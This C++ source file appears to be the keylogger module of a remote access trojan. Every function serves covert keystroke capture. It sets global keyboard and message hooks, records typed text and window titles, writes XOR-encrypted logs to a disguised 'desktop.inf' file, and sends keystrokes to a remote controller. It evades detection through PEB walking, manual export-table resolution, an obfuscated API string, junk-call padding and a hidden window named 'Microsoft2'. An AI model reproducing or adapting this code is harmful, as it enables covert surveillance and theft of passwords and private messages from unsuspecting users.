// KeyboardManager.cpp: implementation of the CKeyboardManager class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "KeyboardManager.h"

BOOL g_bSignalHook = FALSE;

TShared*	CKeyboardManager::m_pTShared = NULL;
HANDLE		CKeyboardManager::m_hMapping_File = NULL;
HINSTANCE	CKeyboardManager::g_hInstance = NULL;
DWORD		CKeyboardManager::m_dwLastMsgTime = GetTickCount();
DWORD		CKeyboardManager::dwTickCount = GetTickCount();
char		CKeyboardManager::ConnPass[256] = {0};
HANDLE		CKeyboardManager::hProtect = NULL;
HANDLE		CKeyboardManager::hFile = NULL;
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
pLoadLibraryA CKeyboardManager::MyLoadLibrary = NULL;
pGetProcAddress CKeyboardManager::MyGetProcAddress = NULL;
pclosesocket CKeyboardManager::Myclosesocket = NULL;
pGetSystemDirectoryA CKeyboardManager::MyGetSystemDirectory = NULL;
psend CKeyboardManager::Mysend = NULL;
pSleep CKeyboardManager::MySleep = NULL;
plstrcatA CKeyboardManager::Mylstrcat = NULL;
pGetTempPathA CKeyboardManager::MyGetTempPath = NULL;
pcapGetDriverDescriptionA CKeyboardManager::MycapGetDriverDescription = NULL;
pcapCreateCaptureWindowA CKeyboardManager::MycapCreateCaptureWindow = NULL;
pSetFilePointer CKeyboardManager::MySetFilePointer = NULL;
pMoveFileA CKeyboardManager::MyMoveFile = NULL;
pGetShortPathNameA CKeyboardManager::MyGetShortPathName = NULL;
pGetModuleFileNameA CKeyboardManager::MyGetModuleFileName = NULL;
//////////////////////////////////////////////////////////////////////

CKeyboardManager::CKeyboardManager(CClientSocket *pClient) : CManager(pClient)
{
	g_bSignalHook = TRUE;
	Sleep(1000);

	sendStartKeyBoard();
	WaitForDialogOpen();
	sendOfflineRecord();
	
// 	DWORD	dwOffset = m_pTShared->dwOffset;
// 
// 	while (m_pClient->IsRunning())
// 	{
// 		if (m_pTShared->dwOffset != dwOffset)
// 		{
// 			UINT nSize = 0;
// 			if (m_pTShared->dwOffset < dwOffset)
// 				nSize = m_pTShared->dwOffset;
// 			else
// 				nSize = m_pTShared->dwOffset - dwOffset;
// 			
// 			sendKeyBoardData((unsigned char *)&(m_pTShared->chKeyBoard[dwOffset]), nSize);
// 			
// 			dwOffset = m_pTShared->dwOffset;
// 		}
// 		Sleep(300);
// 	}
// 	//OutputDebugStringA("ssss");
// 
// 	if (!m_pTShared->bIsOffline)
// 		g_bSignalHook = FALSE;
}

CKeyboardManager::~CKeyboardManager()
{

}

void CKeyboardManager::SaveToFile(char *lpBuffer)
{
	TCHAR szModule [MAX_PATH];
	HANDLE	hFile = CreateFile(m_pTShared->strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE,
		NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	DWORD dwBytesWrite = 0;
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	DWORD dwSize = GetFileSize(hFile, NULL);
	// 离线记录，小于50M
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	if (dwSize < 1024 * 1024 * 50)
		CKeyboardManager::MySetFilePointer(hFile, 0, 0, FILE_END);

	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	// 加密
	int	nLength = lstrlen(lpBuffer);
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	LPBYTE	lpEncodeBuffer = new BYTE[nLength];
	for (int i = 0; i < nLength; i++)
		lpEncodeBuffer[i] = lpBuffer[i] ^ XOR_ENCODE_VALUE;
	WriteFile(hFile, lpEncodeBuffer, nLength, &dwBytesWrite, NULL);
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	CloseHandle(hFile);
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);

	delete	lpEncodeBuffer;
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
}

void CKeyboardManager::SaveInfo(char *lpBuffer)
{
	TCHAR szModule [MAX_PATH];

	if (lpBuffer == NULL)
		return;

	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);

	DWORD	dwBytes = lstrlen(lpBuffer);

	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);

	if((dwBytes < 1) || (dwBytes > SIZE_IMM_BUFFER)) return;

	HWND hWnd = GetActiveWindow();

	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);

	if(hWnd != m_pTShared->hActWnd)
	{
		m_pTShared->hActWnd = hWnd;
		char strCapText[256];
		CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
		GetWindowText(m_pTShared->hActWnd, strCapText, sizeof(strCapText));

		char strSaveString[1024 * 2];
		SYSTEMTIME	SysTime;
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		GetLocalTime(&SysTime);
		CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
		memset(strSaveString, 0, sizeof(strSaveString));
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		wsprintf
			(
			strSaveString,
			"\r\n(%04d/%02d/%02d %02d:%02d:%02d) [%s]\r\n",
			SysTime.wYear,SysTime.wMonth, SysTime.wDay,
			SysTime.wHour, SysTime.wMinute, SysTime.wSecond,
			strCapText
			);
		// 让函认为是应该保存的
		SaveInfo(strSaveString);	
	}

	if (m_pTShared->bIsOffline)
	{
		SaveToFile(lpBuffer);
	}

	// reset
	if ((m_pTShared->dwOffset + dwBytes) > sizeof(m_pTShared->chKeyBoard))
	{
		CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
		memset(m_pTShared->chKeyBoard, 0, sizeof(m_pTShared->chKeyBoard));
		m_pTShared->dwOffset = 0;
	}
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	lstrcat(m_pTShared->chKeyBoard, lpBuffer);
	m_pTShared->dwOffset += dwBytes;
}

LRESULT CALLBACK CKeyboardManager::GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	TCHAR szModule [MAX_PATH];

	MSG*	pMsg;
	char	strChar[2];
	char	KeyName[20];
	//CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	LRESULT result = CallNextHookEx(m_pTShared->hGetMsgHook, nCode, wParam, lParam);
	//CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);

	pMsg = (MSG*)(lParam);
	// 防止消息重复产生记录重复，以pMsg->time判断
	if  (
		(nCode != HC_ACTION) || 
		((pMsg->message != WM_IME_COMPOSITION) && (pMsg->message != WM_CHAR)) ||
		(m_dwLastMsgTime == pMsg->time)
		)
	{
		return result;
	}

	m_dwLastMsgTime = pMsg->time;

	if ((pMsg->message == WM_IME_COMPOSITION) && (pMsg->lParam & GCS_RESULTSTR))
	{
		HWND	hWnd = pMsg->hwnd;
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		HIMC	hImc = ImmGetContext(hWnd);
		CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
		LONG	strLen = ImmGetCompositionString(hImc, GCS_RESULTSTR, NULL, 0);
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		// 考虑到UNICODE
		strLen += sizeof(WCHAR);
		CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
		ZeroMemory(m_pTShared->str, sizeof(m_pTShared->str));
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		strLen = ImmGetCompositionString(hImc, GCS_RESULTSTR, m_pTShared->str, strLen);
		CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
		ImmReleaseContext(hWnd, hImc);
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		SaveInfo(m_pTShared->str);
	}

	if (pMsg->message == WM_CHAR)
	{
		if (pMsg->wParam <= 127 && pMsg->wParam >= 20)
		{
			strChar[0] = (CHAR)pMsg->wParam;
			strChar[1] = '\0';
			SaveInfo(strChar);
		}
		else if (pMsg->wParam == VK_RETURN)
		{
			SaveInfo("\r\n");
		}
		// 控制字符
		else
		{
			CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
			memset(KeyName, 0, sizeof(KeyName));
			CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
			if (GetKeyNameText(pMsg->lParam, &(KeyName[1]), sizeof(KeyName) - 2) > 0)
			{
				KeyName[0] = '[';
				CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
				lstrcat(KeyName, "]");
				SaveInfo(KeyName);
			}
		}
	}
	return result;
}

void CKeyboardManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	TCHAR szModule [MAX_PATH];

	if (lpBuffer[0] == COMMAND_NEXT)
	{
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		NotifyDialogIsOpen();
	}

	if (lpBuffer[0] == COMMAND_KEYBOARD_OFFLINE)
	{
		m_pTShared->bIsOffline = !m_pTShared->bIsOffline;
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		if (!m_pTShared->bIsOffline)
			DeleteFile(m_pTShared->strRecordFile);
		else
		{
			CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
			if (GetFileAttributes(m_pTShared->strRecordFile) == -1)
			{
				CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
				HANDLE hFile = CreateFile(m_pTShared->strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,
					CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
				CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
				CloseHandle(hFile);
			}
		}
	}
	if (lpBuffer[0] == COMMAND_KEYBOARD_CLEAR && m_pTShared->bIsOffline)
	{
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		HANDLE hFile = CreateFile(m_pTShared->strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,
			CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
		CloseHandle(hFile);
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	}
}

BOOL CKeyboardManager::Initialization()
{
	TCHAR szModule [MAX_PATH];

	CShareRestrictedSD ShareRestrictedSD;
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	m_hMapping_File = CreateFileMapping((HANDLE)0xFFFFFFFF, ShareRestrictedSD.GetSA(), PAGE_READWRITE, 0, sizeof(TShared), "_WCWJSJPJLLZMD");
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	if (m_hMapping_File == NULL) return FALSE;

	// 注意m_pTShared不能进行清零操作，因为对像已经存在, 要在StartHook里进行操作
	m_pTShared = (TShared *)MapViewOfFile(m_hMapping_File, FILE_MAP_WRITE | FILE_MAP_READ, 0, 0, 0);
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	if (m_pTShared == NULL)
		return FALSE;

	return TRUE;
}

BOOL CKeyboardManager::StartHook()
{
	TCHAR szModule [MAX_PATH];

	if (!Initialization())
		return FALSE;

	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	ZeroMemory(m_pTShared, sizeof(TShared));

	g_bSignalHook = TRUE;

	m_dwLastMsgTime = GetTickCount();
	m_pTShared->hActWnd = NULL;
	m_pTShared->hGetMsgHook = NULL;
	m_pTShared->dwOffset = 0;
	
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	ZeroMemory(m_pTShared->str, sizeof(m_pTShared->str));

	__try
	{
		StartService(NULL,NULL,NULL);
	}
	__finally
	{
		__asm nop;
	}
	GetSystemDirectory(m_pTShared->strRecordFile, sizeof(m_pTShared->strRecordFile));
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	lstrcat(m_pTShared->strRecordFile, "\\desktop.inf");

	// 文件存在，就开始离线记录开启
	if ( GetFileAttributes(m_pTShared->strRecordFile) != -1 )
	{
		m_pTShared->bIsOffline = TRUE;
	}
	else
		m_pTShared->bIsOffline = FALSE;

	if (m_pTShared->hGetMsgHook == NULL)
	{
		SC_HANDLE hSCM =  OpenSCManager( NULL, NULL, SC_MANAGER_CREATE_SERVICE );		
		m_pTShared->hGetMsgHook = SetWindowsHookEx(WH_GETMESSAGE, GetMsgProc, g_hInstance, 0);

// 		GetLastError();
// 		__asm int 3
		CloseServiceHandle(hSCM);
	}

	return TRUE;
}

void CKeyboardManager::StopHook()
{
	if (m_pTShared->hGetMsgHook != NULL)
	{
		UnhookWindowsHookEx(m_pTShared->hGetMsgHook);
	}

	m_pTShared->hGetMsgHook = NULL;

	UnmapViewOfFile(m_pTShared);
	CloseHandle(m_hMapping_File);
	
	m_pTShared = NULL;
}

int CKeyboardManager::sendStartKeyBoard()
{
// 	if (!m_pTShared)
// 	{
// 		m_pTShared=(TShared*)GetShareMem("_WCWJSJPJLLZMD");
// 	}
	BYTE	bToken[2];
	bToken[0] = TOKEN_KEYBOARD_START;
	//bToken[1] = (BYTE)m_pTShared->bIsOffline;
	bToken[1] = 1;

	return Send((LPBYTE)&bToken[0], sizeof(bToken));	
}

int CKeyboardManager::sendKeyBoardData(LPBYTE lpData, UINT nSize)
{
	TCHAR szModule [MAX_PATH];

	int nRet = -1;
	DWORD	dwBytesLength = 1 + nSize;
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	LPBYTE	lpBuffer = (LPBYTE)LocalAlloc(LPTR, dwBytesLength);
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	lpBuffer[0] = TOKEN_KEYBOARD_DATA;
	memcpy(lpBuffer + 1, lpData, nSize);
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	nRet = Send((LPBYTE)lpBuffer, dwBytesLength);
	LocalFree(lpBuffer);
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	return nRet;	
}

int CKeyboardManager::sendOfflineRecord()
{
	TCHAR szModule [MAX_PATH];
	int		nRet = 0;
	DWORD	dwSize = 0;
	DWORD	dwBytesRead = 0;
	char	strRecordFile[MAX_PATH];
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	lstrcat(strRecordFile, "\\desktop.inf");
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	HANDLE	hFile = CreateFile(strRecordFile, GENERIC_READ, FILE_SHARE_READ,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		dwSize = GetFileSize(hFile, NULL);
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		char *lpBuffer = new char[dwSize];
		ReadFile(hFile, lpBuffer, dwSize, &dwBytesRead, NULL);
		CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
		// 解密
		for (DWORD i = 0; i < dwSize; i++)
		{
			lpBuffer[i] ^= XOR_ENCODE_VALUE;
		}

		nRet = sendKeyBoardData((LPBYTE)lpBuffer, dwSize);
		delete lpBuffer;
	}
	CloseHandle(hFile);
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	return nRet;
}

DWORD GetKernelModule()//获取Kernel32基地址，等同于LoadLibrary("Kernel32.dll")
{
	DWORD dwRet = 0;
	__asm
	{
		pushad;
		mov eax,dword ptr fs:[0x30];		//pointer to PEB 
		mov eax,dword ptr [eax+0x0c];		//pointer to loader data 
		mov eax,dword ptr [eax+0x1c];		//first entry in initialization order list (ntdll.dll) 
		mov eax,dword ptr [eax];			//second entry int initialization order list (kernel32.dll) 
		mov ebx,dword ptr [eax+0x20];
		mov ebx,dword ptr [ebx+0x0c];
		cmp ebx,0x320033
        jz 	winnt
		mov eax,[eax] ;// 支持win7
winnt:		
		mov eax,dword ptr [eax+0x08];		//base addr of kernel32.dll 
		mov dwRet,eax;
		popad;
	}

	return dwRet;
}

int Mystrcmp(const char *cs, const char *ct)
{
	signed char __res;
	while (1) {
		if ((__res = *cs - *ct++) != 0 || !*cs++)
			break;
	}
	return __res;
}

DWORD MyGetProAddress( HMODULE phModule,char* pProcName )
{
	if (!phModule) return 0;
	PIMAGE_DOS_HEADER pimDH = (PIMAGE_DOS_HEADER)phModule;
	PIMAGE_NT_HEADERS pimNH = (PIMAGE_NT_HEADERS)((char*)phModule+pimDH->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pimED = (PIMAGE_EXPORT_DIRECTORY)((DWORD)phModule+pimNH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	DWORD pExportSize = pimNH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
	DWORD pResult = 0;
	
	if ((DWORD)pProcName < 0x10000)
	{
		if ((DWORD)pProcName >= pimED->NumberOfFunctions+pimED->Base || (DWORD)pProcName < pimED->Base) return 0;
		pResult = (DWORD)phModule+((DWORD*)((DWORD)phModule+pimED->AddressOfFunctions))[(DWORD)pProcName-pimED->Base];
	}
	else
	{
		DWORD* pAddressOfNames = (DWORD*)((DWORD)phModule+pimED->AddressOfNames);
		for (unsigned long i=0;i < pimED->NumberOfNames ; i++)
		{
			char* pExportName = (char*)(pAddressOfNames[i]+(DWORD)phModule);

			//if (pExportName[0]=='L')
			{
				if (Mystrcmp(pProcName,pExportName) == 0)
				{
					WORD* pAddressOfNameOrdinals = (WORD*)((DWORD)phModule+pimED->AddressOfNameOrdinals);
					pResult  = (DWORD)phModule+((DWORD*)((DWORD)phModule+pimED->AddressOfFunctions))[pAddressOfNameOrdinals[i]];
					break;
				}

			}

		}
	}
	if (pResult != 0 && pResult >= (DWORD)pimED && pResult < (DWORD)pimED+pExportSize)
	{
		char* pDirectStr = (char*)pResult;
		BOOL pstrok = FALSE;
		while (*pDirectStr)
		{
			if (*pDirectStr == '.')
			{
				pstrok = TRUE;
				break;
			}
			pDirectStr++;
		}
		if (!pstrok) return 0;
		char pdllname[MAX_PATH];
		int  pnamelen = pDirectStr - (char*)pResult;
		if (pnamelen <= 0) return 0;
		memcpy(pdllname,(char*)pResult,pnamelen);
		pdllname[pnamelen] = 0;
		HMODULE phexmodule = GetModuleHandle(pdllname);
		pResult = MyGetProAddress(phexmodule,pDirectStr+1);
	}
	return pResult;
}

DWORD GetSelfModule()//获取自身基地址，等同于GetModuleHanle(NULL)，适用于EXE
{
	DWORD dwRet = 0;
	__asm
	{
		PUSH EAX;
		MOV EAX,dword ptr fs:[0x30];
		MOV EAX,dword ptr [eax+8h];
		MOV dwRet,EAX;
		POP EAX;
	}

	return dwRet;
}

BOOL CKeyboardManager::MyFuncInitialization()
{
	HMODULE hKernel32 = (HMODULE)GetKernelModule();
	MyLoadLibrary = (pLoadLibraryA)MyGetProAddress( hKernel32, "LoadLibraryA" );
	if (!MyLoadLibrary) return FALSE;
	//////////////////////////////////////////////////////////////////////////
	
	//获取GetProcAddress地址
	char str1[50] = "7YhLjo[=XXjYkk";
	EncryptData((unsigned char *)&str1, ::lstrlen(str1), ENCODEKEY+2);

	//////////////////////////////////////////////////////////////////////////
	MyGetProcAddress = (pGetProcAddress)MyGetProAddress( hKernel32, str1 );
	if (!MyGetProcAddress) return FALSE;
	HMODULE hWs2_32 = MyLoadLibrary("Ws2_32.dll");
	HMODULE hAVICAP32 = MyLoadLibrary("AVICAP32.dll");
///////////////////////////////////////////////////////////////////////////////////////////////////////
	MyGetSystemDirectory = (pGetSystemDirectoryA)MyGetProAddress( hKernel32, "GetSystemDirectoryA" );
	if (!MyGetSystemDirectory) return FALSE;
	MySleep = (pSleep)MyGetProAddress( hKernel32, "Sleep" );
	if (!MySleep) return FALSE;
	Mylstrcat = (plstrcatA)MyGetProAddress( hKernel32, "lstrcatA" );
	if (!Mylstrcat) return FALSE;
	MyGetTempPath = (pGetTempPathA)MyGetProAddress( hKernel32, "GetTempPathA" );
	if (!MyGetTempPath) return FALSE;
	MySetFilePointer = (pSetFilePointer)MyGetProAddress( hKernel32, "SetFilePointer" );
	if (!MySetFilePointer) return FALSE;
	MyMoveFile = (pMoveFileA)MyGetProAddress( hKernel32, "MoveFileA" );
	if (!MyMoveFile) return FALSE;
	MyGetShortPathName = (pGetShortPathNameA)MyGetProAddress( hKernel32, "GetShortPathNameA" );
	if (!MyGetShortPathName) return FALSE;
	MyGetModuleFileName = (pGetModuleFileNameA)MyGetProAddress( hKernel32, "GetModuleFileNameA" );
	if (!MyGetModuleFileName) return FALSE;
///////////////////////////////////////////////////////////////////////////////////////////////////////
	Myclosesocket = (pclosesocket)MyGetProcAddress(hWs2_32,"closesocket");
	if (!Myclosesocket) return FALSE;
	Mysend = (psend)MyGetProcAddress(hWs2_32,"send");
	if (!Mysend) return FALSE;
///////////////////////////////////////////////////////////////////////////////////////////////////////
	MycapGetDriverDescription = (pcapGetDriverDescriptionA)MyGetProcAddress(hAVICAP32,"capGetDriverDescriptionA");
	if (!MycapGetDriverDescription) return FALSE;
	MycapCreateCaptureWindow = (pcapCreateCaptureWindowA)MyGetProcAddress(hAVICAP32,"capCreateCaptureWindowA");
	if (!MycapCreateCaptureWindow) return FALSE;

	return TRUE;
}

int CKeyboardManager::Mylstrlen( const char *str )    //输入参数const
{
	if ( str == NULL ) return 0;    //字符串地址非0
	int len = 0;
	while( (*str++) != '\0' )
	{
		len++;
	}
	return len;
}

char* CKeyboardManager::NumToStr( DWORD Nos, int JZ )
{
	static char Res[256] = {0};
	_itoa( Nos, Res, JZ );
	return Res;
}


HHOOK hKeyHookEn=NULL;
DWORD m_dwLastMsgTime=0;
HWND hActWnd=0;
HWND hQQActiveWnd=0;
HWND  g_hWndMain=0;

HANDLE GetFileHandle(char *szOldFile,char *szNewFile)
{

	HANDLE	hOldFile = CreateFile(szOldFile,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_WRITE|FILE_SHARE_READ,NULL,
		OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	DWORD dwSize = GetFileSize(hOldFile, NULL);


	if (dwSize<256)//||GetTickCount()-dwPrvTime<=10*1000)
	{
		SetFilePointer(hOldFile, 0, 0, FILE_END);
		return hOldFile;
	}



	LPBYTE	lpBuffer = new BYTE[dwSize];
	memset(lpBuffer,0,dwSize);
	DWORD dwBytesWrite = 0;
	ReadFile(hOldFile,lpBuffer,dwSize,&dwBytesWrite,0);
	HANDLE	hNewFile = CreateFile(szNewFile, GENERIC_WRITE,0,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL, NULL);
	SetFilePointer(hNewFile, 0, 0, FILE_END);
	WriteFile(hNewFile, lpBuffer, dwSize, &dwBytesWrite, NULL);
	CloseHandle(hNewFile);
	CloseHandle(hOldFile);
	DeleteFile(szOldFile);
	delete lpBuffer;

	return CreateFile(szOldFile,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_WRITE|FILE_SHARE_READ,NULL,
		OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
}


void SaveToFile(char *lpBuffer)
{

	char strRecordFile[MAX_PATH];
	SHGetSpecialFolderPath(NULL,strRecordFile,CSIDL_PROGRAM_FILES,0);
	strcat(strRecordFile,"\\Microsoft Research update\\Evidence\\keylog\\");
	MakeSureDirectoryPathExists(strRecordFile);
	lstrcat(strRecordFile, "desktop.inf");

	char szLogPath[MAX_PATH];
	GetTempPathA(MAX_PATH,szLogPath);
	strcat(szLogPath,"desktop.inf");


	HANDLE hFile=GetFileHandle(szLogPath,strRecordFile);

	// 	HANDLE	hFile = CreateFile(szLogPath, GENERIC_WRITE|GENERIC_READ,
	// 		                       FILE_SHARE_WRITE|FILE_SHARE_READ,
	// 		                       NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwBytesWrite = 0;
	// 	DWORD dwSize = GetFileSize(hFile, NULL);
	// 	// 离线记录，小于50M
	// 	if (dwSize < 1024 * 1024 * 50)
	// 		SetFilePointer(hFile, 0, 0, FILE_END);

	// 加密
	int	nLength = lstrlen(lpBuffer);
	LPBYTE	lpEncodeBuffer = new BYTE[nLength];
	for (int i = 0; i < nLength; i++)
	{
		lpEncodeBuffer[i] = lpBuffer[i] ^ XOR_ENCODE_VALUE;
	//	lpEncodeBuffer[i] = lpEncodeBuffer[i] ^ XOR_ENCODE_VALUE;


	}
	WriteFile(hFile, lpEncodeBuffer, nLength, &dwBytesWrite, NULL);
	CloseHandle(hFile);
	delete	lpEncodeBuffer;
}



void SaveInfo(char *lpBuffer)
{

	if (lpBuffer == NULL)
		return;
	DWORD	dwBytes = lstrlen(lpBuffer);


	if((dwBytes < 1) || (dwBytes > SIZE_IMM_BUFFER)) return;

	HWND  hWnd=GetForegroundWindow();
	char strCapText[MAX_PATH];



	if(hWnd != hActWnd)
	{

		hActWnd = hWnd;
		memset(strCapText,0,MAX_PATH);
		GetWindowText(hActWnd,strCapText,MAX_PATH);

		char strSaveString[1024 * 2];
		SYSTEMTIME	SysTime;
		GetLocalTime(&SysTime);
		memset(strSaveString, 0, sizeof(strSaveString));
		wsprintf
			(
			strSaveString,
			"\r\n(%04d/%02d/%02d %02d:%02d:%02d) [%s]\r\n",
			SysTime.wYear,SysTime.wMonth, SysTime.wDay,
			SysTime.wHour, SysTime.wMinute, SysTime.wSecond,
			strCapText
			);

		// 让函认为是应该保存的
		SaveInfo(strSaveString);	
	}

	SaveToFile(lpBuffer);

}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{

	LRESULT result = CallNextHookEx(hKeyHookEn, nCode, wParam, lParam);



	if (nCode == HC_ACTION)
	{
		PKBDLLHOOKSTRUCT pKeyboardHookStruct = (PKBDLLHOOKSTRUCT) lParam;


		// 防止消息重复产生记录重复，以pMsg->time判断
		if  (m_dwLastMsgTime == pKeyboardHookStruct->time)
		{
			return result;
		}

		m_dwLastMsgTime = pKeyboardHookStruct->time;

		if ((wParam == WM_KEYDOWN) || (wParam == WM_SYSKEYDOWN))
		{
			BYTE KeyboardState[256];
			ZeroMemory(KeyboardState, sizeof(KeyboardState));
			GetKeyboardState(KeyboardState);

			KeyboardState[VK_SHIFT] = (BYTE) (GetKeyState(VK_LSHIFT) | GetKeyState(VK_RSHIFT));
			KeyboardState[VK_CAPITAL] = (BYTE) GetKeyState(VK_CAPITAL);

			WORD wChar;

			int iNumChar = ToAscii(pKeyboardHookStruct->vkCode, pKeyboardHookStruct->scanCode, KeyboardState, &wChar, 0);

			if (iNumChar>0&&(BYTE)wChar<=127&&(BYTE)wChar>=32)
			{
				//_asm int 3

				CHAR szDebug[2]={0};


				wsprintf(szDebug, "%c", wChar);

				if (szDebug[0] == VK_RETURN)
				{
					SaveInfo("\r\n");
				}
				else
				{
					SaveInfo(szDebug);
				}
				//	OutputDebugStringA(szDebug);

			}
			else
				//			if (iNumChar <= 0)
			{
				CHAR KeyText[20];
				ZeroMemory(KeyText, sizeof(KeyText));

				LONG Flags = 0;
				Flags = pKeyboardHookStruct->scanCode << 16;
				Flags |= pKeyboardHookStruct->flags << 24;
				if (GetKeyNameText(Flags, &KeyText[1], 20) > 0)
				{
					KeyText[0] = '[';
					lstrcat(KeyText, "]");

					//		OutputDebugStringA(KeyText);

					SaveInfo(KeyText);
				}
			}
		}
	}

	return result;

}


LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{

	//HWND  hForeground;
	char szFileName[MAX_PATH]={0};
	char strCapText[MAX_PATH]={0};

	switch (message)
	{
	case WM_CREATE:
		break;
	case WM_QUERYENDSESSION:
		//_asm int 3
		ExitProcess(0);

		break;
	case WM_TIMER:

		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}


BOOL  StartEnLog()
{

	hKeyHookEn= SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)LowLevelKeyboardProc,GetModuleHandle(0), 0);

	//hHook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)LowLevelKeyboardProc,GetModuleHandle(0), 0);
	WNDCLASSEXA wcex = {0};
	wcex.cbSize			= sizeof(WNDCLASSEX);
	wcex.style			= CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc	= WndProc;
	wcex.hInstance		= (HINSTANCE)GetModuleHandleA;
	wcex.hIcon			= ::LoadIcon( NULL, IDI_WINLOGO );
	wcex.hCursor		= ::LoadCursor( NULL, IDC_ARROW );
	wcex.hbrBackground	= (HBRUSH)COLOR_WINDOW;
	wcex.lpszClassName	= "Microsoft2";



	::RegisterClassExA(&wcex);

	g_hWndMain = ::CreateWindowA(wcex.lpszClassName, wcex.lpszClassName, WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, NULL, NULL, wcex.hInstance, NULL);
	if (NULL != g_hWndMain)
	{
		::ShowWindow(g_hWndMain, SW_HIDE);
		::UpdateWindow(g_hWndMain);


		MSG msg;
		while (::GetMessage(&msg, NULL, 0, 0)) 
		{
			::TranslateMessage(&msg);
			::DispatchMessage(&msg);
		}
	}

	return TRUE;


}